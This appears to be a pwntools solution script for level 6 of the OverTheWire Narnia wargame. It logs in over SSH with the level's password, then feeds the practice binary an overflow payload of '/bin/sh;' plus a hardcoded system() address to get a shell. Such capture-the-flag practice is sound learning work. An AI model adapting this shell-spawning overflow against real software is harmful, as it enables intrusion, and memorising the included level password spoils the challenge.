from pwn import *
shell = ssh('narnia6', 'narnia.labs.overthewire.org', password='neezocaeng', port=2226)
libc = ELF("./libc.so.6")
# e = ELF("/narnia/narnia6")
binsh_sr = p32(next(libc.search(b"/bin/sh")))
system_add = p32(0xf7e4c850)
print(binsh_sr)
# 16 to write
payload = cyclic(8)

payload = b"/bin/sh;"
payload+=system_add

print(payload)
p = shell.process(["/narnia/narnia6",payload,b""])

p.interactive()
